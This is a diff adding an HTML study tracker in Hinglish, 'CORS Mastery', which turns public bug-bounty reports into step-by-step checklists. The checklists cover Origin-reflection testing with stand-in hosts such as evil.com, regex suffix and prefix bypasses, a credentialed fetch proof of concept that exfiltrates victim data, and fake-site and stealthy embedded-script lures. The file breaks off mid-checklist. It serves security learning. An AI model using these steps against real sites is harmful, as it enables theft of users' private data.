@@ -1,0 +1,2505 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Mission 10 — CORS Mastery</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@700;900&family=Inter:wght@300;400;500;600;700&display=swap');
+
+        :root {
+            --bg-deep: #080c12;
+            --bg-card: #0d1520;
+            --bg-card2: #111b2a;
+            --bg-box: #0a1219;
+            --border: #1a2d40;
+            --border-glow: #ff6b3533;
+            --cyan: #00c8ff;
+            --blue: #4488ff;
+            --purple: #9b59ff;
+            --green: #00ff88;
+            --yellow: #ffd700;
+            --orange: #ff8c42;
+            --red: #ff4757;
+            --accent: #ff6b35;
+            --text-primary: #e8f4f8;
+            --text-secondary: #7ba8c0;
+            --text-dim: #4a7090;
+            --severity-crit: #ff2d55;
+            --severity-high: #ff6b35;
+            --severity-med: #ffd700;
+            --severity-low: #00ff88;
+            --severity-info: #4488ff
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0
+        }
+
+        body {
+            background: var(--bg-deep);
+            color: var(--text-primary);
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            background-image: radial-gradient(ellipse at 20% 0%, #ff6b3508 0%, transparent 50%), radial-gradient(ellipse at 80% 100%, #4488ff06 0%, transparent 50%)
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background: repeating-linear-gradient(0deg, transparent, transparent 2px, #ff6b3503 2px, #ff6b3503 4px);
+            pointer-events: none;
+            z-index: 0
+        }
+
+        .mission-header {
+            text-align: center;
+            padding: 60px 20px 40px;
+            position: relative
+        }
+
+        .mission-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #ff6b3522, #ff2d5522);
+            border: 1px solid var(--accent);
+            color: var(--accent);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            letter-spacing: 4px;
+            padding: 6px 20px;
+            border-radius: 2px;
+            margin-bottom: 20px;
+            text-transform: uppercase
+        }
+
+        .mission-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: clamp(28px, 5vw, 52px);
+            font-weight: 900;
+            background: linear-gradient(135deg, #ff6b35, #ff2d55, #9b59ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            line-height: 1.1;
+            margin-bottom: 8px
+        }
+
+        .mission-subtitle {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: var(--text-secondary);
+            letter-spacing: 2px
+        }
+
+        .mission-stats {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin-top: 30px;
+            flex-wrap: wrap
+        }
+
+        .stat-item {
+            text-align: center
+        }
+
+        .stat-num {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--accent)
+        }
+
+        .stat-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-dim);
+            letter-spacing: 2px;
+            text-transform: uppercase
+        }
+
+        .master-progress {
+            max-width: 900px;
+            margin: 0 auto 50px;
+            padding: 0 20px
+        }
+
+        .progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px
+        }
+
+        .progress-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: var(--accent);
+            letter-spacing: 2px
+        }
+
+        .progress-pct {
+            font-family: 'Orbitron', monospace;
+            font-size: 14px;
+            color: var(--accent)
+        }
+
+        .progress-bar-wrap {
+            height: 6px;
+            background: #1a2d40;
+            border-radius: 3px;
+            overflow: hidden
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), #ff2d55);
+            border-radius: 3px;
+            transition: width .5s ease;
+            box-shadow: 0 0 12px #ff6b3555;
+            width: 0%
+        }
+
+        .phase-section {
+            max-width: 1100px;
+            margin: 0 auto 60px;
+            padding: 0 20px
+        }
+
+        .phase-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 28px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border)
+        }
+
+        .phase-number {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--accent);
+            background: #ff6b3514;
+            border: 1px solid #ff6b3533;
+            padding: 4px 10px;
+            border-radius: 2px;
+            letter-spacing: 2px
+        }
+
+        .phase-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--text-primary)
+        }
+
+        .phase-count {
+            margin-left: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--text-dim)
+        }
+
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(480px, 1fr));
+            gap: 24px
+        }
+
+        .report-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            overflow: hidden;
+            transition: all .3s ease;
+            position: relative;
+            animation: fadeInUp .4s ease both
+        }
+
+        .report-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, var(--accent), #ff2d55);
+            opacity: 0;
+            transition: opacity .3s ease
+        }
+
+        .report-card:hover {
+            border-color: var(--border-glow);
+            box-shadow: 0 8px 40px #ff6b3512, 0 0 0 1px #ff6b3522;
+            transform: translateY(-2px)
+        }
+
+        .report-card:hover::before {
+            opacity: 1
+        }
+
+        .card-header {
+            padding: 18px 20px 14px;
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 12px;
+            border-bottom: 1px solid var(--border);
+            background: var(--bg-card2)
+        }
+
+        .card-meta {
+            flex: 1
+        }
+
+        .report-number {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-dim);
+            letter-spacing: 2px;
+            margin-bottom: 4px
+        }
+
+        .report-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-primary);
+            line-height: 1.3
+        }
+
+        .report-target {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: #ff9060;
+            margin-top: 4px
+        }
+
+        .severity-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            padding: 4px 10px;
+            border-radius: 3px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            white-space: nowrap;
+            flex-shrink: 0
+        }
+
+        .sev-critical {
+            background: #ff2d5520;
+            border: 1px solid #ff2d5560;
+            color: var(--severity-crit)
+        }
+
+        .sev-high {
+            background: #ff6b3520;
+            border: 1px solid #ff6b3560;
+            color: var(--severity-high)
+        }
+
+        .sev-medium {
+            background: #ffd70020;
+            border: 1px solid #ffd70060;
+            color: var(--severity-med)
+        }
+
+        .technique-tag {
+            display: inline-block;
+            background: #ff6b3514;
+            border: 1px solid #ff6b3544;
+            color: var(--accent);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            padding: 2px 8px;
+            border-radius: 2px;
+            letter-spacing: 1px;
+            margin: 4px 4px 0 0
+        }
+
+        .card-body {
+            padding: 16px 20px
+        }
+
+        .scenario-box {
+            background: var(--bg-box);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent);
+            border-radius: 4px;
+            padding: 12px 14px;
+            margin-bottom: 16px
+        }
+
+        .scenario-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--accent);
+            letter-spacing: 2px;
+            margin-bottom: 6px;
+            text-transform: uppercase
+        }
+
+        .scenario-text {
+            font-size: 13px;
+            color: var(--text-secondary);
+            line-height: 1.5
+        }
+
+        .checklist-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--blue);
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 8px
+        }
+
+        .checklist-label::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: var(--border)
+        }
+
+        .checklist {
+            list-style: none
+        }
+
+        .checklist-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 7px 0;
+            border-bottom: 1px solid #1a2d4060;
+            cursor: pointer;
+            transition: all .2s ease;
+            border-radius: 3px
+        }
+
+        .checklist-item:last-child {
+            border-bottom: none
+        }
+
+        .checklist-item:hover {
+            background: #ff6b3506;
+            padding-left: 6px
+        }
+
+        .item-checkbox {
+            width: 18px;
+            height: 18px;
+            border: 1.5px solid var(--accent);
+            border-radius: 3px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 1px;
+            transition: all .2s ease;
+            background: transparent
+        }
+
+        .checklist-item.done .item-checkbox {
+            background: var(--green);
+            border-color: var(--green)
+        }
+
+        .checklist-item.done .item-checkbox::after {
+            content: '✓';
+            color: #080c12;
+            font-size: 11px;
+            font-weight: 700
+        }
+
+        .item-step {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--accent);
+            flex-shrink: 0;
+            padding-top: 1px
+        }
+
+        .item-text {
+            font-size: 12.5px;
+            color: var(--text-secondary);
+            line-height: 1.5;
+            flex: 1;
+            transition: color .2s
+        }
+
+        .checklist-item.done .item-text {
+            color: var(--text-dim);
+            text-decoration: line-through;
+            text-decoration-color: #4a709066
+        }
+
+        .card-progress {
+            margin-top: 14px;
+            padding-top: 12px;
+            border-top: 1px solid var(--border)
+        }
+
+        .card-progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 6px
+        }
+
+        .card-progress-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--text-dim);
+            letter-spacing: 1px
+        }
+
+        .card-progress-pct {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--green)
+        }
+
+        .card-bar-wrap {
+            height: 3px;
+            background: #1a2d40;
+            border-radius: 2px;
+            overflow: hidden
+        }
+
+        .card-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--green));
+            border-radius: 2px;
+            transition: width .4s ease;
+            width: 0%
+        }
+
+        .mindset-box {
+            background: #9b59ff0a;
+            border: 1px solid #9b59ff33;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 14px
+        }
+
+        .mindset-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--purple);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .mindset-text {
+            font-size: 12px;
+            color: #b89ddd;
+            line-height: 1.5;
+            font-style: italic
+        }
+
+        .protip-box {
+            background: #ffd70009;
+            border: 1px solid #ffd70033;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 10px
+        }
+
+        .protip-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--yellow);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .protip-text {
+            font-size: 12px;
+            color: #c9a83a;
+            line-height: 1.5
+        }
+
+        .chain-box {
+            background: #ff6b3509;
+            border: 1px solid #ff6b3530;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 10px
+        }
+
+        .chain-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--orange);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .chain-formula {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: #d4823a;
+            line-height: 1.6
+        }
+
+        .impact-box {
+            background: #ff2d5509;
+            border: 1px solid #ff2d5530;
+            border-radius: 4px;
+            padding: 10px 14px;
+            margin-top: 10px
+        }
+
+        .impact-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 9px;
+            color: var(--red);
+            letter-spacing: 2px;
+            margin-bottom: 5px
+        }
+
+        .impact-text {
+            font-size: 12px;
+            color: #d44466;
+            line-height: 1.5
+        }
+
+        .filter-bar {
+            max-width: 1100px;
+            margin: 0 auto 30px;
+            padding: 0 20px;
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            align-items: center
+        }
+
+        .filter-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            color: var(--text-dim);
+            letter-spacing: 1px
+        }
+
+        .filter-btn {
+            background: transparent;
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 10px;
+            padding: 5px 14px;
+            border-radius: 3px;
+            cursor: pointer;
+            transition: all .2s ease;
+            letter-spacing: 1px
+        }
+
+        .filter-btn:hover,
+        .filter-btn.active {
+            border-color: var(--accent);
+            color: var(--accent);
+            background: #ff6b3510
+        }
+
+        .mission-footer {
+            text-align: center;
+            padding: 40px 20px 60px;
+            border-top: 1px solid var(--border)
+        }
+
+        .footer-text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--text-dim);
+            letter-spacing: 2px
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-deep)
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #1a2d40;
+            border-radius: 3px
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--accent)
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px)
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0)
+            }
+        }
+
+        .report-card:nth-child(2n) {
+            animation-delay: .05s
+        }
+
+        .report-card:nth-child(3n) {
+            animation-delay: .10s
+        }
+
+        code.c {
+            color: #ff9060;
+            font-size: 11px;
+            background: #ff6b3511;
+            padding: 1px 5px;
+            border-radius: 3px
+        }
+
+        @media(max-width:700px) {
+            .cards-grid {
+                grid-template-columns: 1fr
+            }
+
+            .mission-stats {
+                gap: 20px
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <header class="mission-header">
+        <div class="mission-badge">⬡ MISSION 10 ⬡ CORS MASTERY ⬡</div>
+        <h1 class="mission-title">CORS<br>MASTERY</h1>
+        <p class="mission-subtitle">// ORIGIN REFLECTION · REGEX BYPASS · NULL ORIGIN · CHAIN ATTACKS · CACHE POISON —
+            30 REAL BOUNTY REPORTS</p>
+        <div class="mission-stats">
+            <div class="stat-item">
+                <div class="stat-num" id="totalReports">30</div>
+                <div class="stat-label">Total Reports</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num" id="completedItems">0</div>
+                <div class="stat-label">Steps Done</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num">110</div>
+                <div class="stat-label">Techniques Mapped</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-num" id="completedCards">0</div>
+                <div class="stat-label">Reports Completed</div>
+            </div>
+        </div>
+    </header>
+    <div class="master-progress">
+        <div class="progress-header"><span class="progress-label">◈ OVERALL MISSION PROGRESS</span><span
+                class="progress-pct" id="masterPct">0%</span></div>
+        <div class="progress-bar-wrap">
+            <div class="progress-bar-fill" id="masterBar"></div>
+        </div>
+    </div>
+    <div class="filter-bar">
+        <span class="filter-label">FILTER ▸</span>
+        <button class="filter-btn active" onclick="filterCards('all',this)">ALL (30)</button>
+        <button class="filter-btn" onclick="filterCards('critical',this)">🔴 CRITICAL</button>
+        <button class="filter-btn" onclick="filterCards('high',this)">🟠 HIGH</button>
+        <button class="filter-btn" onclick="filterCards('medium',this)">🟡 MEDIUM</button>
+        <button class="filter-btn" onclick="filterCards('complete',this)">✅ COMPLETE</button>
+        <button class="filter-btn" onclick="filterCards('incomplete',this)">⏳ IN PROGRESS</button>
+    </div>
+
+    <!-- ═══ PHASE 1 — ORIGIN REFLECTION (BASIC) ═══ -->
+    <section class="phase-section" id="phase1">
+        <div class="phase-header"><span class="phase-number">PHASE 01</span><span class="phase-title">ORIGIN REFLECTION
+                — THE BLANK CHECK</span><span class="phase-count" id="p1count">0 / 3 reports</span></div>
+        <div class="cards-grid" id="grid-phase1">
+
+            <!-- REPORT #01 — Uber -->
+            <div class="report-card" data-severity="critical" id="report-01">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #01 · Total #270</div>
+                        <div class="report-title">Uber Full Account Takeover via Origin Reflection</div>
+                        <div class="report-target">🎯 Uber · @bb0y · $3,000 · Full Account Takeover</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">Origin Reflect</span><span
+                                class="technique-tag">Credentials: true</span><span class="technique-tag">PII
+                                Leak</span></div>
+                    </div><span class="severity-badge sev-critical">🔴 CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Uber ke <code class="c">/api/get_user_details</code> endpoint par
+                            <code class="c">Origin: https://evil-hacker.com</code> bheja → Server ne bina whitelist
+                            check ke <code class="c">Access-Control-Allow-Origin: https://evil-hacker.com</code> + <code
+                                class="c">Allow-Credentials: true</code> return kiya. Malicious site se victim ki UUID,
+                            Email, Phone hacker ke server par leak.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Sensitive API endpoints dhoondho</strong> — <code
+                                    class="c">/api/user</code>, <code class="c">/api/profile</code>, <code
+                                    class="c">/api/account</code> jaise endpoints Burp mein intercept karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Origin header inject karo</strong> — Burp Repeater mein <code
+                                    class="c">Origin: https://evil.com</code> add karo aur response check karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>ACAO + ACAC check karo</strong> — Response mein <code
+                                    class="c">Access-Control-Allow-Origin</code> reflect hua? <code
+                                    class="c">Allow-Credentials: true</code> bhi hai? = 🔴 Critical bug.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>POC banao</strong> — Malicious HTML page banao with <code
+                                    class="c">fetch(url, {credentials: 'include'})</code> jo victim ka data exfiltrate
+                                kare.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Impact demonstrate karo</strong> — UUID, Email, Phone, Session
+                                Token — jo bhi leak ho raha hai, saab screenshot mein capture karo.</span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">🧠 KEY TAKEAWAY</div>
+                        <div class="mindset-text">"Agar Allow-Credentials true hai aur Origin Reflect ho raha hai, toh
+                            ye 100% ek High/Critical bug hai." — Ye CORS hunting ka Golden Rule hai.</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #02 — Twitter -->
+            <div class="report-card" data-severity="high" id="report-02">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #02 · Total #271</div>
+                        <div class="report-title">Twitter (X) Ads API Credentials Leak</div>
+                        <div class="report-target">🎯 Twitter (X) · @lucas_vba · $1,500 · API Key + Billing Leak</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">Ads Subdomain</span><span
+                                class="technique-tag">Business Logic</span><span class="technique-tag">API Key
+                                Theft</span></div>
+                    </div><span class="severity-badge sev-high">🟠 HIGH</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Hacker ne <code class="c">ads.twitter.com</code> ko target kiya
+                            (jahan money involved hai). Internal API <code
+                                class="c">/i/api/1.1/ads/accounts/.../cards</code> par <code
+                                class="c">Origin: https://attacker.com</code> reflect hua + Credentials true. Victim ke
+                            private API key + billing info leak.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Business subdomains target karo</strong> — <code
+                                    class="c">ads.</code>, <code class="c">business.</code>, <code
+                                    class="c">payment.</code>, <code class="c">billing.</code> — jahan paisa hai wahan
+                                CORS loose hota hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Internal API endpoints map karo</strong> — Burp Suite mein
+                                saare API calls capture karo jo dashboard load hote waqt hote hain.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Har endpoint par Origin test karo</strong> — Ek ek API call
+                                par manually <code class="c">Origin: https://attacker.com</code> inject karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Social Engineering POC banao</strong> — "Free Analytics Tool"
+                                ya "Ad Performance Checker" jaisi fake site se victim ko attract karo.</span>
+                        </li>
+                    </ul>
+                    <div class="protip-box">
+                        <div class="protip-label">💡 PRO TIP</div>
+                        <div class="protip-text">Hamesha un subdomains par focus karo jahan developers nayi APIs test
+                            karte waqt CORS flags "Loose" chhod dete hain — especially <code class="c">ads.</code>,
+                            <code class="c">staging.</code>, <code class="c">dev.</code> environments.</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- REPORT #03 — Gratipay -->
+            <div class="report-card" data-severity="medium" id="report-03">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">◈ REPORT #03 · Total #272</div>
+                        <div class="report-title">Gratipay Sensitive User Privacy Data Leak</div>
+                        <div class="report-target">🎯 Gratipay · @boris_bering · $500 · Private Email Exposure</div>
+                        <div style="margin-top:8px;"><span class="technique-tag">Privacy Violation</span><span
+                                class="technique-tag">JSON Endpoint</span><span class="technique-tag">PII Leak</span>
+                        </div>
+                    </div><span class="severity-badge sev-medium">🟡 MEDIUM</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">📋 SCENARIO</div>
+                        <div class="scenario-text">Privacy-focused platform jahan anonymous donations hoti hain. <code
+                                class="c">/~username/emails.json</code> endpoint par Origin reflect + Credentials true.
+                            Hacker ne blog post mein script embed ki → Logged-in user ka private email auto-leak.</div>
+                    </div>
+                    <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>JSON endpoints dhoondho</strong> — <code
+                                    class="c">.json</code>, <code class="c">/api/</code>, <code class="c">/v1/</code>
+                                jaise paths mein sensitive data return hona check karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Privacy angle dekho</strong> — Kya leaked data (email, phone)
+                                user ki anonymity tod raha hai? = High impact report.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Stealthy POC banao</strong> — Blog post, forum comment, ya
+                                email mein script embed karke silent data theft demonstrate karo.</span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">🧠 PHASE 1 SUMMARY</div>
+                        <div class="mindset-text">Phase 1 ka formula: (1) Sensitive JSON endpoint dhundho → (2) Origin
+                            reflection check karo → (3) Allow-Credentials: true confirm karo → (4) POC banao. Bina
+                            credentials ke sirf public data milega.</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+<!-- ═══ PHASE 2 — REGEX BYPASS ATTACKS ═══ -->
+<section class="phase-section" id="phase2">
+    <div class="phase-header"><span class="phase-number">PHASE 02</span><span class="phase-title">REGEX & WHITELIST
+            BYPASS ATTACKS</span><span class="phase-count" id="p2count">0 / 5 reports</span></div>
+    <div class="cards-grid" id="grid-phase2">
+
+        <!-- REPORT #04 — Suffix Trick -->
+        <div class="report-card" data-severity="high" id="report-04">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #04 · Total #273</div>
+                    <div class="report-title">Fintech Bypass via Regex Suffix Trick (target.com.evil.com)</div>
+                    <div class="report-target">🎯 ██████ (Fintech) · @security_researcher · $2,500 · Financial Data
+                    </div>
+                    <div style="margin-top:8px;"><span class="technique-tag">Suffix Bypass</span><span
+                            class="technique-tag">Regex Flaw</span><span class="technique-tag">Subdomain Trick</span>
+                    </div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Developer ka code sirf check kar raha tha ki string mein <code
+                            class="c">target.com</code> hai ya nahi. Hacker ne <code
+                            class="c">Origin: https://target.com.evil.com</code> bheja → Server ne allow kiya kyunki
+                        "target.com" toh maujood hai. Par asli domain <code class="c">evil.com</code> tha → Bank Balance
+                        + Transactions leak.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Basic reflection fail?</strong> — Agar direct <code
+                                class="c">evil.com</code> kaam nahi karta, toh regex tricks start karo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Suffix bypass try karo</strong> — <code
+                                class="c">https://target.com.hacker.com</code> bhejo (target name as subdomain of your
+                            domain).</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
+                            class="item-text"><strong>Prefix bypass try karo</strong> — <code
+                                class="c">https://hacker-target.com</code> bhejo (target name ka prefix with
+                            dash).</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">04</span><span
+                            class="item-text"><strong>Dash bypass try karo</strong> — <code
+                                class="c">https://target.com-hacker.com</code> bhejo.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">05</span><span
+                            class="item-text"><strong>Domain register karo</strong> — Agar koi variant kaam kare toh $10
+                            mein domain khareed ke proper POC banao.</span>
+                    </li>
+                </ul>
+                <div class="card-progress">
+                    <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                            class="card-progress-pct">0%</span></div>
+                    <div class="card-bar-wrap">
+                        <div class="card-bar-fill"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- REPORT #05 — Suffix Matching -->
+        <div class="report-card" data-severity="high" id="report-05">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">◈ REPORT #05 · Total #274</div>
+                    <div class="report-title">Suffix Matching Error — Logistics Personal Data Leak</div>
+                    <div class="report-target">🎯 ██████.com (Logistics) · @root_hacker · $1,000 · Address + Phone Leak
+                    </div>
+                    <div style="margin-top:8px;"><span class="technique-tag">End-Match Bypass</span><span
+                            class="technique-tag">Word Boundary</span><span class="technique-tag">$10 Domain</span>
+                    </div>
+                </div><span class="severity-badge sev-high">🟠 HIGH</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">📋 SCENARIO</div>
+                    <div class="scenario-text">Server ka rule: "Origin must end with target.com". Hacker ne <code
+                            class="c">https://hacker-target.com</code> bheja → Server ne sirf end-match kiya, dot
+                        boundary check nahi kiya → Personal address + phone number leak from tracking API.</div>
+                </div>
+                <div class="checklist-label">✅ EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>End-matching pattern detect karo</strong> — Agar <code
+                                class="c">sub.target.com</code> allowed hai par <code class="c">evil.com</code> nahi,
+                            toh regex end-matching hai.</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>No-dash variant try karo</strong> — <code
+                                class="c">https://anythingtarget.com</code> (bina dash ke).</span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">03</span><span
